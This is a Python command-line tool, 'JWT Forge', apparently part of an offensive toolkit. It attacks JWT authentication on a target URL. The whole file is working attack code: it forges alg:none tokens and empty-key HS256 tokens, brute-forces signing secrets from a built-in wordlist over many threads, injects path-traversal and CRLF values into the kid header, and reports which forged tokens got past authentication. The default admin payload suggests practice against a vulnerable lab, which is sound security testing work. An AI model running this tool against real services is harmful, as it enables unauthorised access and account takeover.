#!/usr/bin/env python3
"""
JWT Forge — JWT attack toolkit for Schatten Brutal.
Attacks: alg:none, HS256-empty, HS256-weak-secrets, key brute force, kid injection.

Usage:
    python3 jwt-forge.py <target_url> [options]

Options:
    --token TOKEN        Existing JWT to forge from (extracts payload)
    --secret-list FILE   Wordlist for HS256 brute (default: common JWT secrets)
    --kid-inject         Test kid header injection
    --output FILE        Save forged tokens to file
"""

import sys
import json
import base64
import hashlib
import hmac
import argparse
import itertools
import string
from pathlib import Path
from concurrent.futures import ThreadPoolExecutor, as_completed

try:
    import jwt as pyjwt
except ImportError:
    pyjwt = None

try:
    import requests
except ImportError:
    print("pip install requests"); sys.exit(1)

# ponytail: hardcoded common secrets, use rockyou.txt for real engagements
COMMON_SECRETS = [
    "", "secret", "password", "123456", "jwt_secret", "supersecret",
    "key123", "admin", "test", "changeme", "your-256-bit-secret",
    "shhhhh", "1234567890", "qwerty", "abc123", "letmein",
    "jwt_secret_key", "mysecret", "token_secret", "api_secret",
    "HS256_key", "jwt-key", "development", "staging", "production",
    "s3cr3t", "topsecret", "supersecretkey", "my_jwt_secret",
    "2fb9440e18770b7c55aa67596b04870b25f85f46a35d2f835fa5c4236e5f9b12",
]

ALG_NONE_VARIANTS = [
    "none", "None", "NONE", "nOnE",
]


def b64url_encode(data: bytes) -> str:
    return base64.urlsafe_b64encode(data).rstrip(b"=").decode()


def b64url_decode(s: str) -> bytes:
    padding = 4 - len(s) % 4
    s += "=" * padding
    return base64.urlsafe_b64decode(s)


def parse_jwt(token: str) -> dict:
    """Parse JWT without verification."""
    parts = token.split(".")
    if len(parts) != 3:
        raise ValueError(f"Invalid JWT: expected 3 parts, got {len(parts)}")
    header = json.loads(b64url_decode(parts[0]))
    payload = json.loads(b64url_decode(parts[1]))
    return {"header": header, "payload": payload, "raw": token}


def forge_alg_none(payload: dict) -> list[str]:
    """Generate alg:none variants."""
    tokens = []
    for alg in ALG_NONE_VARIANTS:
        header = {"alg": alg, "typ": "JWT"}
        h = b64url_encode(json.dumps(header).encode())
        p = b64url_encode(json.dumps(payload).encode())
        tokens.append(f"{h}.{p}.")
    return tokens


def forge_hs256_empty(payload: dict) -> str:
    """Forge HS256 with empty string as key."""
    header = {"alg": "HS256", "typ": "JWT"}
    h = b64url_encode(json.dumps(header).encode())
    p = b64url_encode(json.dumps(payload).encode())
    sig = hmac.new(b"", f"{h}.{p}".encode(), hashlib.sha256).digest()
    return f"{h}.{p}.{b64url_encode(sig)}"


def forge_hs256_secret(payload: dict, secret: str) -> str:
    """Forge HS256 with known secret."""
    header = {"alg": "HS256", "typ": "JWT"}
    h = b64url_encode(json.dumps(header).encode())
    p = b64url_encode(json.dumps(payload).encode())
    sig = hmac.new(secret.encode(), f"{h}.{p}".encode(), hashlib.sha256).digest()
    return f"{h}.{p}.{b64url_encode(sig)}"


def forge_kid_injection(payload: dict) -> list[str]:
    """Generate kid header injection tokens."""
    injections = [
        '../../../dev/null',
        '/dev/null',
        'key\n\rX-Injected: true',
        '{"kty":"oct","kid":"../../dev/null","k":""}',
    ]
    tokens = []
    for kid in injections:
        header = {"alg": "HS256", "typ": "JWT", "kid": kid}
        h = b64url_encode(json.dumps(header).encode())
        p = b64url_encode(json.dumps(payload).encode())
        sig = hmac.new(b"", f"{h}.{p}".encode(), hashlib.sha256).digest()
        tokens.append({"token": f"{h}.{p}.{b64url_encode(sig)}", "kid": kid})
    return tokens


def test_token(target_url: str, token: str, auth_header: str = "Authorization") -> dict:
    """Test a forged token against the target."""
    headers = {auth_header: f"Bearer {token}"}
    try:
        r = requests.get(target_url, headers=headers, timeout=10, allow_redirects=False)
        return {
            "status": r.status_code,
            "length": len(r.text),
            "token_preview": token[:50] + "...",
            "body_preview": r.text[:200],
        }
    except requests.RequestException as e:
        return {"error": str(e), "token_preview": token[:50] + "..."}


def brute_force_hs256(target_url: str, payload: dict, wordlist: list[str],
                       auth_header: str = "Authorization", workers: int = 10) -> list[dict]:
    """Brute force HS256 signing key."""
    hits = []

    def try_secret(secret):
        token = forge_hs256_secret(payload, secret)
        return test_token(target_url, token, auth_header), secret

    with ThreadPoolExecutor(max_workers=workers) as pool:
        futures = {pool.submit(try_secret, s): s for s in wordlist}
        for i, future in enumerate(as_completed(futures)):
            result, secret = future.result()
            if result.get("status") and result["status"] != 401 and result["status"] != 403:
                hits.append({"secret": secret, **result})
                print(f"  [HIT] status={result['status']} secret={secret}")
            if (i + 1) % 50 == 0:
                print(f"  tried {i+1}/{len(wordlist)}")

    return hits


def main():
    parser = argparse.ArgumentParser(description="JWT Forge — Schatten Brutal")
    parser.add_argument("target", help="Target URL to test forged tokens against")
    parser.add_argument("--token", help="Existing JWT to extract payload from")
    parser.add_argument("--payload", help="JSON payload string (if no --token)")
    parser.add_argument("--secret-list", help="Wordlist file for HS256 brute")
    parser.add_argument("--kid-inject", action="store_true", help="Test kid header injection")
    parser.add_argument("--auth-header", default="Authorization", help="Auth header name")
    parser.add_argument("--workers", type=int, default=10, help="Thread workers for brute")
    parser.add_argument("--output", help="Output file for results")
    parser.add_argument("--all", action="store_true", help="Run all attack variants")
    args = parser.parse_args()

    # Parse payload
    if args.token:
        parsed = parse_jwt(args.token)
        payload = parsed["payload"]
        print(f"[+] Extracted payload from token: {json.dumps(payload, indent=2)}")
    elif args.payload:
        payload = json.loads(args.payload)
    else:
        # Default admin payload for testing
        payload = {"email": "admin@juice-sh.op", "role": "admin", "iat": 9999999999}

    print(f"[*] Target: {args.target}")
    print(f"[*] Payload: {json.dumps(payload)}")
    print()

    all_results = []

    # 1. Alg:none
    print("[1/5] Alg:none attack...")
    none_tokens = forge_alg_none(payload)
    for token in none_tokens:
        result = test_token(args.target, token, args.auth_header)
        alg = json.loads(b64url_decode(token.split(".")[0]))["alg"]
        print(f"  alg={alg} → status={result.get('status', 'error')}")
        all_results.append({"attack": f"alg_none_{alg}", **result})

    # 2. HS256 empty key
    print("\n[2/5] HS256 empty key...")
    empty_token = forge_hs256_empty(payload)
    result = test_token(args.target, empty_token, args.auth_header)
    print(f"  → status={result.get('status', 'error')}")
    all_results.append({"attack": "hs256_empty", **result})

    # 3. HS256 common secrets
    print("\n[3/5] HS256 common secrets...")
    wordlist = COMMON_SECRETS
    if args.secret_list:
        wordlist = Path(args.secret_list).read_text().strip().split("\n")
    hits = brute_force_hs256(args.target, payload, wordlist, args.auth_header, args.workers)
    all_results.extend([{"attack": "hs256_brute", **h} for h in hits])

    # 4. Kid injection
    if args.kid_inject or args.all:
        print("\n[4/5] Kid header injection...")
        kid_tokens = forge_kid_injection(payload)
        for kt in kid_tokens:
            result = test_token(args.target, kt["token"], args.auth_header)
            print(f"  kid={kt['kid'][:40]} → status={result.get('status', 'error')}")
            all_results.append({"attack": f"kid_inject", "kid": kt["kid"], **result})

    # 5. Summary
    print("\n" + "=" * 60)
    print("[*] RESULTS SUMMARY")
    print("=" * 60)
    hits_found = [r for r in all_results if r.get("status") and r["status"] not in (401, 403, None)]
    if hits_found:
        print(f"[!] {len(hits_found)} tokens potentially bypassed auth:")
        for h in hits_found:
            print(f"  {h.get('attack', '?')} → status={h['status']}")
    else:
        print("[-] No auth bypass found with tested variants")

    if args.output:
        out_path = Path(args.output)
        if out_path.is_dir() or not out_path.suffix:
            out_path = out_path / "03_jwt_forge.json"
        out_path.write_text(json.dumps(all_results, indent=2, default=str))
        print(f"\n[+] Results saved to {out_path}")

    return 0 if not hits_found else 1


if __name__ == "__main__":
    sys.exit(main())
